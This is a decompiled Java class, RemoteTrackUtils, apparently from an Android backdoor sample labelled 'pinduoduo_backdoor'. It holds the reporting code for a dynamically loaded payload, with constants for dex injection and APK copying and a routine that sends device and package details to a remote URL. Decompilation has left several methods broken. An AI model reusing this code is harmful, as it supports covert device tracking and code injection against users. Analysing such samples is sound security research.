package com.google.android.sd.biz_dynamic_dex.oppo_proxy.server;

import android.content.Context;
import android.os.Build;
import android.text.TextUtils;
import com.google.android.sd.biz_dynamic_dex.base.DynamicUtils;
import com.google.android.sd.biz_dynamic_dex.base.INotBizProcess;
import java.util.HashMap;
import java.util.Map;
import java.util.UUID;
import org.json.JSONObject;

public class RemoteTrackUtils implements INotBizProcess {
  private static final int CMD_DOUBLE_INJECT = 400;
  
  private static StringBuffer LOCAL_LOG;
  
  public static String SD_VERSION = "";
  
  public static String SID = "";
  
  public static final int TYPE_COPY_APK = 4;
  
  public static final int TYPE_COPY_DEX = 3;
  
  public static final int TYPE_COPY_TMP = 5;
  
  public static final int TYPE_DELETE_DIR = 1;
  
  public static final int TYPE_DELETE_DIR_FORCE = 2;
  
  public static final int TYPE_DELETE_TMP = 11;
  
  public static final int TYPE_DELETE_TMP_FORCE = 12;
  
  public static final int TYPE_EXT_LOG = 10;
  
  public static final int TYPE_TMP_BASE = 10;
  
  public static String URL = "";
  
  public static void commitRemoteLog(Context paramContext) {
    try {
      if (LOCAL_LOG == null)
        return; 
      HashMap<Object, Object> hashMap = new HashMap<Object, Object>();
      hashMap.put("type", String.valueOf(10));
      hashMap.put("ext_log", LOCAL_LOG.toString());
      hashMap.put("pkg", paramContext.getPackageName());
      LOCAL_LOG = new StringBuffer();
      return;
    } finally {
      paramContext = null;
    } 
  }
  
  public static void init() {
    LOCAL_LOG = new StringBuffer();
  }
  
  public static void remoteLog(String paramString) {
    try {
      StringBuffer stringBuffer = LOCAL_LOG;
      if (stringBuffer == null)
        return; 
      stringBuffer.append(System.currentTimeMillis());
      stringBuffer.append("_");
      stringBuffer.append(paramString);
      stringBuffer.append("\n");
      return;
    } catch (Exception exception) {
      return;
    } 
  }
  
  public static void submit100ProcessTrackAsync(Context paramContext, String paramString1, String paramString2) {
    try {
      return;
    } finally {
      paramContext = null;
    } 
  }
  
  public static void submit400TrackAsync(final Context context, final int type, final boolean success, final String msg) {
    remoteLog(String.format("type:[%s],success:[%s],msg:[%s]", new Object[] { Integer.valueOf(type), Boolean.valueOf(success), msg }));
    (new Thread(new Runnable() {
          public void run() {
            try {
              String str;
              HashMap<Object, Object> hashMap = new HashMap<Object, Object>();
              hashMap.put("type", String.valueOf(type));
              if (success) {
                str = "1";
              } else {
                str = "0";
              } 
              hashMap.put("status", str);
              hashMap.put("details", msg);
              return;
            } finally {
              Exception exception = null;
            } 
          }
        })).start();
  }
  
  public static void submitTrack(Context paramContext, int paramInt, Map<String, String> paramMap) {
    if (TextUtils.isEmpty(URL))
      return; 
    try {
      HashMap<Object, Object> hashMap = new HashMap<Object, Object>();
      hashMap.put("request_id", UUID.randomUUID().toString());
      hashMap.put("pid", SID);
      hashMap.put("manufacturer", DynamicUtils.getManufacturer());
      hashMap.put("android_version", String.valueOf(Build.VERSION.SDK_INT));
      hashMap.put("business", String.valueOf(paramInt));
      Map<String, String> map = paramMap;
      if (paramMap == null)
        map = new HashMap<String, String>(); 
      map.put("sd_version", SD_VERSION);
      map.put("sd_source", paramContext.getPackageName());
      map.put("sd_source_version", DynamicUtils.getSourceVersion(paramContext));
      map.put("client_timestamp", String.valueOf(System.currentTimeMillis()));
      JSONObject jSONObject = new JSONObject(hashMap);
      jSONObject.put("ext_param", new JSONObject(map));
      String str = jSONObject.toString();
      str = HttpUtils.get(URL, str);
      return;
    } finally {
      paramContext = null;
    } 
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\75dcc8ea-d0f9-4222-b8dd-2a83444f9cd6-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\oppo_proxy\server\RemoteTrackUtils.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */